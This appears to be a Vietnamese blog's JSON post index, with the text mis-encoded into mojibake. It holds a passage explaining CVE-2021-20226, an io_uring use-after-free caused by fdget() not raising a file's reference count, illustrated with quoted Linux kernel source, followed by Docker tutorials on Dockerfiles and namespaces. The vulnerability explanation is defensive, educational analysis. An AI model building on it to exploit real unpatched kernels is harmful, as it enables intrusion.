Äá»ƒ hiá»ƒu reference counter trong cáº¥u trÃºc file hoáº¡t Ä‘á»™ng nhÆ° tháº¿ nÃ o, trÆ°á»›c tiÃªn cáº§n hiá»ƒu cÃ¡ch thá»©c hoáº¡t Ä‘á»™ng cá»§a open/close. CÃ¡ch thá»©c nÃ y sáº½ phá»¥ thuá»™c vÃ o tá»«ng file riÃªng, nhÆ°ng cÃ³ 1 sá»‘ Ä‘iá»ƒm chung:\nOpen Táº¡o 1 cáº¥u trÃºc file vÃ  thiáº¿t láº­p reference counter = 1 1 2 3 4 5 6 7 8 9 10 static struct file *__alloc_file(int flags, const struct cred *cred) { struct file *f; int error; f = kmem_cache_zalloc(filp_cachep, GFP_KERNEL); ...... atomic_long_set(\u0026amp;f-\u0026gt;f_count, 1); ...... return f; } ÄÄƒng kÃ­ nÃ³ vÃ o file description table (fd_install). 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 static long do_sys_openat2(int dfd, const char __user *filename, struct open_how *how) { ...... fd = get_unused_fd_flags(how-\u0026gt;flags); if (fd \u0026gt;= 0) { struct file *f = do_filp_open(dfd, tmp, \u0026amp;op); if (IS_ERR(f)) { put_unused_fd(fd); fd = PTR_ERR(f); } else { fsnotify_open(f); fd_install(fd, f); } } putname(tmp); return fd; } close 1 XÃ³a trong file description table.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 int __close_fd(struct files_struct *files, unsigned fd) { struct file *file; struct fdtable *fdt; spin_lock(\u0026amp;files-\u0026gt;file_lock); fdt = files_fdtable(files); if (fd \u0026gt;= fdt-\u0026gt;max_fds) goto out_unlock; file = fdt-\u0026gt;fd[fd]; if (!file) goto out_unlock; rcu_assign_pointer(fdt-\u0026gt;fd[fd], NULL); __put_unused_fd(files, fd); spin_unlock(\u0026amp;files-\u0026gt;file_lock); return filp_close(file, files); out_unlock: spin_unlock(\u0026amp;files-\u0026gt;file_lock); return -EBADF; } Giáº£m reference counter cá»§a cáº¥u trÃºc file (fput) 1 2 3 4 5 6 int filp_close(struct file *filp, fl_owner_t id) { ...... fput(filp); return retval; } á» Ä‘Ã¢y chÃº Ã½ tá»›i hÃ m fget()/fput(). ChÃºng sáº½ tÄƒng hoáº·c giáº£m reference counter vÃ  fput() sáº½ giáº£i phÃ³ng cá»§a cáº¥u trÃºc file khi reference counter báº±ng 0. Náº¿u chÃºng ta má»Ÿ file báº±ng fget() reference counter sáº½ khÃ´ng thá»ƒ báº±ng 0 ngay cáº£ khi ta Ä‘Ã³ng file trÆ°á»›c khi gá»i fput() (bá»™ Ä‘áº¿m sáº½ cÃ³ gÃ­a trá»‹ lÃ  1 khi cháº¡y lá»‡nh open(), tÄƒng lÃªn 2 khi gá»i fget() vÃ  náº¿u lÃºc nÃ y Ä‘Ã³ng thÃ¬ nÃ³ sáº½ giáº£m xuá»‘ng cÃ²n 1). Do Ä‘Ã³, náº¿u file bá»‹ Ä‘Ã³ng khi Ä‘ang sá»­ dá»¥ng váº«n khÃ´ng cÃ³ váº¥n Ä‘á» gÃ¬, vÃ¬ reference counter váº«n chÆ°a báº±ng 0 nÃªn cáº¥u trÃºc file khÃ´ng thá»ƒ bá»‹ giáº£i phÃ³ng.\nXÃ©t trÆ°á»ng há»£p gá»i mmap, sáº½ cÃ³ váº¥n Ä‘á» xáº£y ra náº¿u vÃ¹ng nhá»› Ä‘Æ°á»£c giáº£i phÃ³ng trÆ°á»›c khi gá»i munmap, tháº­m chÃ­ lÃ  khi gá»i close() rá»“i mÃ  tiáº¿p tá»¥c gá»i munmap váº«n sáº½ bá»‹ lá»—i. Do Ä‘Ã³, fget() Ä‘Æ°á»£c dÃ¹ng trong mmap Ä‘á»ƒ trÃ¡nh trÆ°á»ng há»£p bá»™ nhá»› bá»‹ giáº£i phÃ³ng.\n1 2 3 4 5 6 7 8 9 10 11 unsigned long ksys_mmap_pgoff(unsigned long addr, unsigned long len, unsigned long prot, unsigned long flags, unsigned long fd, unsigned long pgoff) { struct file *file = NULL; unsigned long retval; if (!(flags \u0026amp; MAP_ANONYMOUS)) { audit_mmap_fd(fd, flags); file = fget(fd); ...... } fdget() which doesnâ€™t change reference counter 2 hÃ m fdget()/fdput() thÆ°á»ng xuyÃªn Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ tham kháº£o tá»›i nhá»¯ng cáº¥u trÃºc file Ä‘Æ°á»£c sá»­ dá»¥ng nhiá»u trong system call handlers.\nVÃ­ dá»¥, trong system call read, cáº¥u trÃºc file Ä‘Æ°á»£c sá»­ dá»¥ng giá»¯a fdget()/fdget_pos() vÃ  fdput()/fdput_pos() Ä‘Æ°á»£c sá»­ dá»¥ng nhÆ° sau:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 ssize_t ksys_read(unsigned int fd, char __user *buf, size_t count) { struct fd f = fdget_pos(fd); ssize_t ret = -EBADF; if (f.file) { loff_t pos, *ppos = file_ppos(f.file); if (ppos) { pos = *ppos; ppos = \u0026amp;pos; } ret = vfs_read(f.file, buf, count, ppos); if (ret \u0026gt;= 0 \u0026amp;\u0026amp; ppos) f.file-\u0026gt;f_pos = pos; fdput_pos(f); } return ret; } SYSCALL_DEFINE3(read, unsigned int, fd, char __user *, buf, size_t, count) { return ksys_read(fd, buf, count); } CÃ³ má»™t lÃ­ do nÃ o Ä‘Ã³ Ä‘á»ƒ há»‡ thá»‘ng khÃ´ng cáº§n pháº£i tÄƒng/giáº£m reference counter cá»§a cáº¥u trÃºc file má»™t cÃ¡ch thÆ°á»ng xuyÃªn, cÃ³ láº½ do áº£nh hÆ°á»Ÿng cá»§a bá»™ nhá»› cache(). Do Ä‘Ã³, fdget() sáº½ khÃ´ng tÄƒng reference counter cá»§a cáº¥u trÃºc file dÆ°á»›i má»™t sá»‘ Ä‘iá»u kiá»‡n nháº¥t Ä‘á»‹nh. fdget() cuá»‘i cÃ¹ng sáº½ gá»i hÃ m __fget_light()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 /* * Lightweight file lookup - no refcnt increment if fd table isn\u0026#39;t shared. * * You can use this instead of fget if you satisfy all of the following * conditions: * 1) You must call fput_light before exiting the syscall and returning control * to userspace (i.e. you cannot remember the returned struct file * after * returning to userspace). * 2) You must not call filp_close on the returned struct file * in between * calls to fget_light and fput_light. * 3) You must not clone the current task in between the calls to fget_light * and fput_light. * * The fput_needed flag returned by fget_light should be passed to the * corresponding fput_light. */ static unsigned long __fget_light(unsigned int fd, fmode_t mask) { struct files_struct *files = current-\u0026gt;files; struct file *file; if (atomic_read(\u0026amp;files-\u0026gt;count) == 1) { file = __fcheck_files(files, fd); if (!file || unlikely(file-\u0026gt;f_mode \u0026amp; mask)) return 0; return (unsigned long)file; } else { file = __fget(fd, mask, 1); if (!file) return 0; return FDPUT_FPUT | (unsigned long)file; } } Trong chÆ°Æ¡ng trÃ¬nh Ä‘a luá»“ng, file descriptor sáº½ Ä‘Æ°á»£c chia sáº» (\u0026amp;file-\u0026gt;count \u0026gt;= 2) vÃ  cÃ¹ng 1 file descriptor trá» Ä‘áº¿n Ä‘áº¿n cÃ¹ng 1 tá»‡p. Trong trÆ°á»ng há»£p nÃ y, nhá»¯ng thread khÃ¡c cÃ³ gá»i close() trong khi read() váº«n Ä‘ang thá»±c thi. LÃºc nÃ y, fdget() cá»§a read() system call Ä‘Æ°á»£c gá»i Ä‘á»ƒ giáº£m reference counter.\nTuy nhiÃªn, vá»›i chÆ°Æ¡ng trÃ¬nh cháº¡y Ä‘Æ¡n luá»“ng khÃ¡c, táº¡i 1 thá»i Ä‘iá»ƒm chá»‰ cÃ³ 1 thread thá»±c hiá»‡n, nÃªn sáº½ khÃ´ng thá»ƒ xáº£y tra trÆ°á»ng há»£p trÃªn, do Ä‘Ã³, fdget() khÃ´ng cáº§n pháº£i tÄƒng reference counter. Do Ä‘Ã³, nÃ³ sáº½ khÃ´ng tÄƒng reference counter trá»« khi file descriptor table Ä‘Æ°á»£c chia sáº».\nCombining vulnerabilities with the fdget() spec Lá»— há»•ng tá»« viá»‡c chuyá»ƒn 1 tham kháº£o file struct vÃ o 1 cáº¥u trÃºc worker trá» tá»›i mÃ  khÃ´ng tÄƒng reference counter vÃ  náº¿u chÆ°Æ¡ng trÃ¬nh gá»‘c lÃ  Ä‘Æ¡n luá»“ng, thÃ¬ \u0026amp;file-\u0026gt;count = 1 dÃ¹ cho file descripton table Ä‘Æ°á»£c chia sáº». \u0026amp;files-\u0026gt;count = 1 cÃ³ nghÄ©a lÃ  fdget() sáº½ khÃ´ng tÄƒng reference counter trong cáº¥u trÃºc file. Do Ä‘Ã³, vÃ¹ng nhá»› cá»§a cáº¥u trÃºc file Ä‘Æ°á»£c sá»± dá»¥ng bá»Ÿi fdget() cÃ³ thá»ƒ bá»‹ giáº£i phÃ³ng á»Ÿ 1 thá»i Ä‘iá»ƒm nÃ o Ä‘Ã³.\nTÃ³m táº¯t Lá»—i nÃ y nhÆ° sau:\nAIO worker chia sáº» cáº¥u trÃºc file_struct vá»›i thread Ä‘Æ°á»£c gá»i, vÃ  táº¡i thá»i Ä‘iá»ƒm, reference counter cá»§a cáº¥u trÃºc files_struct khÃ´ng tÄƒng lÃªn. vÃ¬ fdget khÃ´ng tÄƒng reference counter cá»§a cáº¥u trÃºc file trong khi reference counter Ä‘Æ°á»£c khá»Ÿi táº¡o cÃ³ giÃ¡ trá»‹ lÃ  1. file Ä‘Æ°á»£c má»Ÿ bá»Ÿi fdget()cÃ³ thá»ƒ bá»‹ Ä‘Ã³ng vÃ  giáº£i phÃ³ng trong worker. VÃ¬ cáº¥u trÃºc file bá»‹ giáº£i phÃ³ng nÃªn lá»—i UAF cÃ³ thá»ƒ xáº£y ra. ","description":"khai thÃ¡c lá»—i trÃªn io_uring dáº«n tá»›i UAF (chÆ°a hoÃ n thÃ nh)","id":16,"section":"posts","tags":["cve, io_uring"],"title":"TÃ¬m hiá»ƒu vá» CVE-2021-20226","uri":"https://minhlongmt183.github.io/posts/cve-2021-20226/"},{"content":"Tiáº¿p tá»¥c vá»›i bÃ i trÆ°á»›c, hÃ´m nay chÃºng ta sáº½ Ä‘i qua nhá»¯ng nhÃ¡nh tiáº¿p theo cá»§a docker foundation - nhá»¯ng kiáº¿n thá»©c ná»n táº£ng cá»§a docker. NhÃ¬n má»™t cÃ¡ch tá»•ng quan vá» ná»™i dung cá»§a nhá»¯ng kiáº¿n thá»©c ná»n táº£ng\nBuild Container Image ChÃºng ta sáº½ tiáº¿n hÃ nh build má»™t container image, á»Ÿ Ä‘Ã¢y chá»§ yáº¿u Ã´n láº¡i kiáº¿n thá»©c vá» Dockerfile Ä‘Ã£ há»c á»Ÿ bÃ i trÆ°á»›c\nStep 1 - Base Images Táº¥t cáº£ cÃ¡c Docker Images Ä‘á»u báº¯t Ä‘áº§u tá»« má»™t base image. Base image nÃ y giá»‘ng vá»›i image mÃ  chÃºng ta táº£i trá»±c tiáº¿p tá»« cÃ¡c Registry vá» Ä‘á»ƒ xÃ¢y dá»±ng cÃ¡c container. BÃªn cáº¡nh dÃ¹ng tÃªn, cÃ¡c base image cÃ²n dÃ¹ng tag Ä‘á»ƒ phÃ¢n biá»‡t giá»¯a cÃ¡c phiÃªn báº£n trong cÃ¹ng 1 image.\nTrong Dockerfile, ta dÃ¹ng FROM Ä‘á»ƒ chá»‰ Ä‘á»‹nh base image sá»­ dá»¥ng. VÃ­ dá»¥ ta muá»‘n dÃ¹ng má»™t base image lÃ  nginx:1.11-alpine thÃ¬ trong Dockerfile ta sáº½ khai bÃ¡o:\n1 FROM nginx:1.11-alpine Step 2 - Running Commands CÃ³ nhiá»u cÃ¢u lá»‡nh cáº§n thá»±c thi khi build image, ta cÃ³ thá»ƒ chá»‰ Ä‘á»‹nh nhá»¯ng lá»‡nh nÃ y trong Dockerfile. Chi tiáº¿t vá» nhá»¯ng cÃ¢u lá»‡nh nÃ y Ä‘Ã£ Ä‘Æ°á»£c tháº£o luáº­n á»Ÿ pháº§n 6. á» Ä‘Ã¢y ta dÃ¹ng lá»‡nh COPY Ä‘á»ƒ copy ná»™i dung file index.html Ä‘áº¿n Ä‘á»‹a chá»‰ cá»¥ thá»ƒ trÃªn docker\n1 2 FROM nginx:1.11-alpine COPY index.html /usr/share/nginx/html Step 3 - Exposing Ports Tá»« khÃ³a EXPOSE dÃ¹ng Ä‘á»ƒ chá»‰ Ä‘á»‹nh cá»•ng mÃ  á»©ng dá»¥ng cÃ³ sá»­ dá»¥ng khi muá»‘n truy cáº­p vÃ o Docker tá»« bÃªn ngoÃ i.\nVÃ­ dá»¥, ta muá»‘n chá»‰ Ä‘á»‹nh cá»•ng 80 sáº½ cho phÃ©p truy cáº­p, ta khai bÃ¡o nhÆ° sau:\n1 EXPOSE 80 Step 4 - Default Commands Default Command chá»‰ Ä‘á»‹nh nhá»¯ng lá»‡nh sáº½ Ä‘Æ°á»£c thá»±c thi sau khi build xong image Ä‘á»ƒ tiáº¿n hÃ nh setup mÃ´i trÆ°á»ng mÃ  chÃºng ta mong muá»‘n. Nhá»¯ng default command nÃ y báº¯t Ä‘áº§u báº±ng CMD. VÃ­ dá»¥, chÃºng ta muá»‘n cháº¡y cÃ¢u lá»‡nh nginx -g daemon off; ta sáº½ thá»±c thi nhÆ° sau:\n1 CMD [\u0026#34;nginx\u0026#34;, \u0026#34;-g\u0026#34;, \u0026#34;daemon\u0026#34;, \u0026#34;off;\u0026#34;] Step 5 - Building Containers Káº¿t há»£p nhá»¯ng cÃ¢u lá»‡nh trÃªn, ta cÃ³ má»™t Dockerfile nhÆ°u sau:\n1 2 3 4 FROM nginx:1.11-alpine COPY index.html /usr/share/nginx/html EXPOSE 80 CMD [\u0026#34;nginx\u0026#34;, \u0026#34;-g\u0026#34;, \u0026#34;daemon\u0026#34;, \u0026#34;off;\u0026#34;] Äá»ƒ thá»±c thi vÃ  tiáº¿n hÃ nh build image, ta dÃ¹ng lá»‡nh docker build:\n1 docker build -t my-image:v1 . Step 6 - Launching New Image Cuá»‘i cÃ¹ng cháº¡y image báº±ng lá»‡nh docker run.\nVÃ¬ nhá»¯ng kiáº¿n thá»©c nÃ y chÃºng ta Ä‘á»u Ä‘Ã£ tháº£o luáº­n qua á»Ÿ nhá»¯ng chÆ°Æ¡ng trÆ°á»›c, nÃªn pháº§n nÃ y tÃ´i chá»‰ Ä‘i nhanh qua.\n","description":"Docker Foundation (tiáº¿p theo)","id":17,"section":"posts","tags":["Docker"],"title":"TÃ¬m hiá»ƒu vÃ  sá»­ dá»¥ng docker (P7)","uri":"https://minhlongmt183.github.io/posts/docker_p7/"},{"content":"\rKá»ƒ tá»« chÆ°Æ¡ng nÃ y, mÃ¬nh báº¯t Ä‘áº§u chuyá»ƒn qua há»c ná»™i dá»¥ng docker trÃªn katacoda.com. VÃ  cÃ¡ch há»c mÃ¬nh cÅ©ng sáº½ khÃ¡c, tÃ³m táº¯t báº±ng sÆ¡ Ä‘á»“ tÆ° duy vÃ  trÃ¬nh bÃ y láº¡i nhá»¯ng gÃ¬ mÃ¬nh hiá»ƒu sau khi há»c Ä‘Æ°á»£c trÃªn blog theo flow cá»§a sÆ¡ Ä‘á»“ tÆ° duy. Má»¥c Ä‘Ã­ch cá»§a blog nÃ y giÃºp mÃ¬nh Ã´n láº¡i, hiá»ƒu rÃµ hÆ¡n nhá»¯ng kiáº¿n thá»©c Ä‘Ã£ há»c.\rTá»•ng quan vá» khÃ³a há»c Trong khÃ³a há»c nÃ y, mÃ¬nh sáº½ Ä‘i qua má»™t sá»‘ chá»§ Ä‘á» chÃ­nh nhÆ° hÃ¬nh bÃªn dÆ°á»›i. Trong nhá»¯ng chá»§ Ä‘á» nÃ y cÃ³ nhá»¯ng chá»§ Ä‘á» má»›i vÃ  nhá»¯ng chá»§ Ä‘á» Ä‘Ã£ Ä‘á» cáº­p qua trong khÃ³a há»c cá»§a anh XuanThuLabChanel. Nhá»¯ng pháº§n Ä‘Ã£ nÃ³i qua thÃ¬ sáº½ khÃ´ng nÃ³i láº¡i mÃ  chá»‰ ghi chÃº thÃªm nhá»¯ng má»¥c má»›i, chÆ°a Ä‘á» cáº­p á»Ÿ nhá»¯ng pháº§n trÆ°á»›c Ä‘Ã³.\nWhat is the container Nhá»¯ng khÃ¡i niá»‡m cÄƒn báº£n vá» container Ä‘Ã£ Ä‘Æ°á»£c Ä‘á» cáº­p khÃ¡ nhiá»u á»Ÿ trong bÃ i docker_overview vÃ  á»Ÿ p1 trong chuá»—i bÃ i há»c tá»« anh XuanThuLabChanel. Trong pháº§n nÃ y chÃºng ta sáº½ Ä‘i qua má»™t sá»‘ khÃ¡i niá»‡m cÅ©ng nhÆ° má»™t sá»‘ chá»§ Ä‘á»:\nnamespaces KhÃ¡i niá»‡m: Namespace - khÃ´ng gian tÃªn:\nLÃ  má»™t trong nhá»¯ng thÃ nh pháº§n cÆ¡ báº£n cá»§a container.\ngiá»›i háº¡n nhá»¯ng gÃ¬ cÃ¡c process cÃ³ thá»ƒ tháº¥y vÃ  truy cáº­p trÃªn há»‡ thá»‘ng.\nÄ‘á»‹nh nghÄ©a vá»‹ trÃ­ inode trÃªn Ä‘Ä©a.\ninode lÃ  má»™t cáº¥u trÃºc dá»¯ liá»‡u trong má»™t há»‡ thá»‘ng táº­p tin Unix - phong cÃ¡ch mÃ´ táº£ cá»§a má»™t táº­p tin há»‡ thá»‘ng Ä‘á»‘i tÆ°á»£ng nhÆ° má»™t táº­p tin hoáº·c má»™t thÆ° má»¥c. Sá»‘ lÆ°á»£ng nÃºt trong tÃ i khoáº£n báº±ng vá»›i sá»‘ lÆ°á»£ng tá»‡p vÃ  thÆ° má»¥c cÃ³ trÃªn Ä‘Ã³. Hay cÃ³ thá»ƒ hiá»ƒu, inodes = sá»‘ files + folder.\nThÃ´ng qua má»™t namespace, nhiá»u process khÃ¡c nhau cÃ³ thá»ƒ chia sáº», giao tiáº¿p vá»›i nhau.\nKhi má»™t container báº¯t Ä‘áº§u cháº¡y, nÃ³ sáº½ táº¡o ra má»™t namespace má»›i cho Ä‘á»ƒ cÃ¡c process cháº¡y trong há»™p cÃ¡t (sandboxes) cháº¡y. Báº±ng cÃ¡ch phÃ¢n bá»• namespace dá»±a trÃªn cÃ¡c pid, táº¡i thá»i Ä‘iá»ƒm cháº¡y, má»™t process sáº½ truy cáº­p vÃ o namespace tÆ°Æ¡ng á»©ng vá»›i pid cá»§a mÃ¬nh, viá»‡c nÃ y giÃºp cho process cÃ³ cáº£m giÃ¡c chá»‰ má»™t mÃ¬nh nÃ³ cháº¡y trÃªn há»‡ thá»‘ng.\nMá»™t sá»‘ loáº¡i biáº¿n thá»ƒ cá»§a namespace Trong namespace Ä‘á»‹nh nghÄ©a má»™t sá»‘ biáº¿n thá»ƒ:\nMount (mnt): mount namespace Ä‘iá»u khiá»ƒn cÃ¡c mount point. Khi táº¡o, cÃ¡c liÃªn káº¿t tá»« mount namespace hiá»‡n táº¡i Ä‘Æ°á»£c sao chÃ©p sang khÃ´ng gian tÃªn má»›i, nhÆ°ng cÃ¡c mount point Ä‘Æ°á»£c táº¡o sau Ä‘Ã³ khÃ´ng truyá»n giá»¯a mount namespace. Cá» sao chÃ©p Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ táº¡o khÃ´ng gian tÃªn má»›i thuá»™c loáº¡i nÃ y lÃ  CLONE_NEWNS - viáº¿t táº¯t cá»§a \u0026ldquo;NEW NameSpace\u0026rdquo;. Thuáº­t ngá»¯ nÃ y khÃ´ng mang tÃ­nh mÃ´ táº£ (vÃ¬ nÃ³ khÃ´ng cho biáº¿t loáº¡i khÃ´ng gian tÃªn nÃ o sáº½ Ä‘Æ°á»£c táº¡o) bá»Ÿi vÃ¬ mount namespaces lÃ  loáº¡i namespace Ä‘áº§u tiÃªn vÃ  táº¡i thá»i Ä‘iá»ƒm, cÃ¡c nhÃ  thiáº¿t káº¿ khÃ´ng lÆ°á»ng trÆ°á»›c Ä‘Æ°á»£c sáº½ cÃ³ báº¥t ká»³ loáº¡i namespaces nÃ o khÃ¡c.\nProcess ID(pid): PID namespaces cung cáº¥p nhá»¯ng process vá»›i táº­p pid Ä‘á»™c láº­p vá»›i nhá»¯ng namespace khÃ¡c. CÃ¡c PID namespace cÃ³ thá»ƒ lá»“ng vÃ o nhau nghÄ©a lÃ : má»—i process Ä‘Æ°á»£c táº¡o trong má»™t namespace sáº½ cÃ³ 1 pid, vÃ  pid nÃ y sáº½ Ä‘Æ°á»£c tháº¥y bá»Ÿi cÃ¡c process á»Ÿ trong namespace hiá»‡n táº¡i ra cho Ä‘áº¿n namespace Ä‘áº§u tiÃªn. Nghe cÃ³ váº» giá»‘ng nhÆ° trong cÃ´ng ty, má»™t nhÃ¢n viÃªn má»›i vÃ o sáº½ cÃ³ má»™t thÃ´ng tin vÃ  Ä‘á»‹nh danh riÃªng, nhá»¯ng thÃ´ng tin nÃ y sáº½ Ä‘Æ°á»£c biáº¿t bá»Ÿi sáº¿p anh ta, sáº¿p cá»§a sáº¿p, sáº¿p cá»§a sáº¿p cá»§a sáº¿p ğŸ¤£ğŸ¤£ğŸ¤£.\nProcess Ä‘áº§u tiÃªn sáº½ Ä‘Æ°á»£c gÃ¡n PID lÃ  1, nÃ³ cÃ³ vá»‹ trÃ­ giá»‘ng nhÆ° chá»§ tich há»™i Ä‘á»“ng quáº£n trá»‹ cá»§a cÃ´ng ty, tá»« trÃªn nhÃ¬n xuá»‘ng cÃ³ thá»ƒ tháº¥y táº¥t cáº£ nhá»¯ng process khÃ¡c, vÃ  cÃ³ quyá»n \u0026ldquo;Ä‘uá»•i\u0026rdquo; táº¥t cáº£ nhá»¯ng process dÆ°á»›i trÆ°á»›ng cá»§a mÃ¬nh.\nUser ID (user): User namespace lÃ  má»™t tÃ­nh nÄƒng Ä‘á»ƒ cung cáº¥p kháº£ nÄƒng phÃ¢n quyá»n vÃ  phÃ¢n nhÃ³m ngÆ°á»i dÃ¹ng trÃªn nhiá»u process, kháº£ náº±ng Ä‘Ã£ sáºµn cÃ³ tá»« kernel 3.8. Vá»›i quyá»n admin, cÃ³ thá»ƒ xÃ¢y dá»±ng má»™t container cÃ³ váº» nhÆ° cÃ³ quyá»n admin nhÆ°ng khÃ´ng thá»±c sá»± cáº¥p cÃ¡c Ä‘áº·c quyá»n nÃ¢ng cao cho cÃ¡c process cá»§a ngÆ°á»i dÃ¹ng. Giá»‘ng nhÆ° PID namespace, user namespace dÃ¹ng Ä‘Æ°á»£c lá»“ng vÃ o nhau vÃ  má»—i user namespace má»›i Ä‘Æ°á»£c coi lÃ  con cá»§a user namespace Ä‘Ã£ táº¡o ra nÃ³.\nUser namespace chá»©a má»™t báº£ng Ã¡nh xáº¡ Ä‘á»ƒ chuyá»ƒn Ä‘á»•i cÃ¡c user ID tá»« container sang há»‡ thá»‘ng. Äiá»u nÃ y cho phÃ©p, vÃ­ dá»¥, ngÆ°á»i dÃ¹ng root cÃ³ user id 0 trong container nhÆ°ng thá»±c sá»± Ä‘Æ°á»£c há»‡ thá»‘ng coi lÃ  user id 1.400.000 Ä‘á»ƒ kiá»ƒm tra quyá»n sá»Ÿ há»¯u. Má»™t báº£ng tÆ°Æ¡ng tá»± Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ Ã¡nh xáº¡ group id vÃ  kiá»ƒm tra quyá»n sá»Ÿ há»¯u.\nÄá»ƒ táº¡o Ä‘iá»u kiá»‡n thuáº­n lá»£i cho viá»‡c cÃ´ láº­p Ä‘áº·c quyá»n cá»§a cÃ¡c hÃ nh Ä‘á»™ng admin, má»—i loáº¡i namespace Ä‘Æ°á»£c coi lÃ  thuá»™c sá»Ÿ há»¯u cá»§a má»™t user namespace dá»±a trÃªn user namespace Ä‘ang hoáº¡t Ä‘á»™ng táº¡i thá»i Ä‘iá»ƒm táº¡o. NgÆ°á»i dÃ¹ng quyá»n admin trong user namespace thÃ­ch há»£p sáº½ Ä‘Æ°á»£c phÃ©p thá»±c hiá»‡n cÃ¡c hÃ nh Ä‘á»™ng admin trong loáº¡i namespace Ä‘Ã³. VÃ­ dá»¥: náº¿u má»™t process cÃ³ quyá»n quáº£n trá»‹ Ä‘á»ƒ thay Ä‘á»•i Ä‘á»‹a chá»‰ IP cá»§a giao diá»‡n máº¡ng, nÃ³ cÃ³ thá»ƒ lÃ m nhÆ° váº­y miá»…n lÃ  user namespace cá»§a chÃ­nh nÃ³ giá»‘ng vá»›i (hoáº·c tá»• tiÃªn cá»§a) user namespace sá»Ÿ há»¯u network namespace. Do Ä‘Ã³ user namespace ban Ä‘áº§u cÃ³ quyá»n kiá»ƒm soÃ¡t quáº£n trá»‹ Ä‘á»‘i vá»›i táº¥t cáº£ cÃ¡c loáº¡i user namespace trong há»‡ thá»‘ng.\nNetwork (net): Network namespace áº£o hÃ³a network stack. Khi Ä‘Æ°á»£c táº¡o, network namespace chá»‰ chá»©a má»™t loopback interface. Má»—i network interface (lÃ  physical hay virtual) thá»ƒ hiá»‡n chÃ­nh xÃ¡c má»™t namespace vÃ  cÃ³ thá»ƒ di chuyá»ƒn giá»¯a cÃ¡c namespace vá»›i nhau.\nMá»™t namespace sáº½ cÃ³ táº­p cÃ¡c Ä‘á»‹a chá»‰ IP riÃªng, chá»©a nhá»¯ng routing table, socket listing, connection tracking table, firewall, vÃ  nhá»¯ng resources liÃªn quan tá»›i network khÃ¡c.\nKhi há»§y má»™t khÃ´ng gian tÃªn máº¡ng sáº½ phÃ¡ há»§y báº¥t ká»³ giao diá»‡n áº£o nÃ o bÃªn trong nÃ³ vÃ  di chuyá»ƒn báº¥t ká»³ giao diá»‡n váº­t lÃ½ nÃ o bÃªn trong nÃ³ trá»Ÿ láº¡i khÃ´ng gian tÃªn máº¡ng ban Ä‘áº§u.\nInterprocess Communication (ipc): ipc namespace dÃ¹ng Ä‘á»ƒ cÃ´ láº­p cÃ¡c process trong giao tiáº¿p. Äiá»u nÃ y ngÄƒn khÃ´ng cho cÃ¡c quÃ¡ trÃ¬nh trong cÃ¡c vÃ¹ng tÃªn IPC khÃ¡c nhau sá»­ dá»¥ng, cháº³ng háº¡n nhÆ° nhÃ³m hÃ m SHM Ä‘á»ƒ thiáº¿t láº­p pháº¡m vi bá»™ nhá»› dÃ¹ng chung giá»¯a hai quÃ¡ trÃ¬nh. Thay vÃ o Ä‘Ã³, má»—i quÃ¡ trÃ¬nh sáº½ cÃ³ thá»ƒ sá»­ dá»¥ng cÃ¹ng má»™t sá»‘ nháº­n dáº¡ng cho má»™t vÃ¹ng bá»™ nhá»› dÃ¹ng chung vÃ  táº¡o ra hai vÃ¹ng riÃªng biá»‡t nhÆ° váº­y.\nUTS: UTS namespace (UNIX Time-Sharing) cho phÃ©p má»™t há»‡ thá»‘ng duy nháº¥t cÃ³ váº» nhÆ° cÃ³ cÃ¡c tÃªn miá»n vÃ  mÃ¡y chá»§ lÆ°u trá»¯ khÃ¡c nhau cho cÃ¡c quÃ¡ trÃ¬nh khÃ¡c nhau. \u0026ldquo;Khi má»™t quy trÃ¬nh táº¡o má»™t vÃ¹ng tÃªn UTS má»›i \u0026hellip; tÃªn mÃ¡y chá»§ vÃ  miá»n cá»§a vÃ¹ng tÃªn UTS má»›i Ä‘Æ°á»£c sao chÃ©p tá»« cÃ¡c giÃ¡ trá»‹ tÆ°Æ¡ng á»©ng trong vÃ¹ng tÃªn UTS cá»§a ngÆ°á»i gá»i\u0026rdquo;.\nCÃ²n nhiá»u loáº¡i biáº¿n thá»ƒ khÃ¡c, chÃºng ta cÃ³ thá»ƒ xem chÃºng táº¡i Ä‘Ã¢y. Unshare tool lÃ  cÃ´ng cá»¥ giÃºp chÃºng ta cÃ³ thá»ƒ cháº¡y má»™t process vÃ  yÃªu cáº§u nÃ³ táº¡o ra má»™t namespace má»›i. 1 2 3 4 5 6 7 $ sudo unshare --fork --pid --mount-proc bash $ ps PID TTY TIME CMD 1 pts/0 00:00:00 bash 9 pts/0 00:00:00 ps $ exit exit What happens when we share a namespace? ChÃºng ta cÃ³ thá»ƒ liá»‡t kÃª táº¥t cáº£ nhá»¯ng namespace báº±ng lá»‡nh:\n1 ls -lha /proc/$DBPID/ns/ Má»™t cÃ´ng cá»¥ khÃ¡c chÃºng ta cÃ³ thá»ƒ dÃ¹ng Ä‘Ã³ lÃ  nsenter dÃ¹ng Ä‘á»ƒ gÃ¡n má»™t process vÃ o má»™t khÃ´ng gian tÃªn Ä‘Ã£ tá»“n táº¡i, cÃ´ng cá»¥ nÃ y sáº½ há»¯u dá»¥ng khi debug.\n1 nsenter --target $DBPID --mount --uts --ipc --net --pid ps aux Container images Container images chÃºng ta Ä‘Ã£ Ä‘Æ°á»£c há»c kÄ© trong cÃ¡c bÃ i trÆ°á»›c, á»Ÿ Ä‘Ã¢y cÃ³ má»™t sá»‘ chÃº Ã½ nhá» nhá»:\nNhá»¯ng images chá»©a dá»¯ liá»‡u thÃ´ (metadata) Ä‘á»ƒ lÃ m cÆ¡ sá»Ÿ Ä‘á»ƒ xÃ¢y dá»±ng nhá»¯ng image khÃ¡c. ChÃºng ta Ä‘Ã£ biáº¿t, images sáº½ cÃ³ nhiá»u layer, cÃ³ 1 layer gá»‘c vÃ  nhá»¯ng layer sau lÃ  quÃ¡ trÃ¬nh chÃºng ta cÃ i Ä‘áº·t, thiáº¿t lÃ¢p thÃªm mÃ´i trÆ°á»ng khi cháº¡y contaier Ä‘Æ°á»£c sinh ra tá»« image ban Ä‘áº§u. á» Ä‘Ã¢y, má»—i tar file Ä‘Æ°á»£c xem nhÆ° 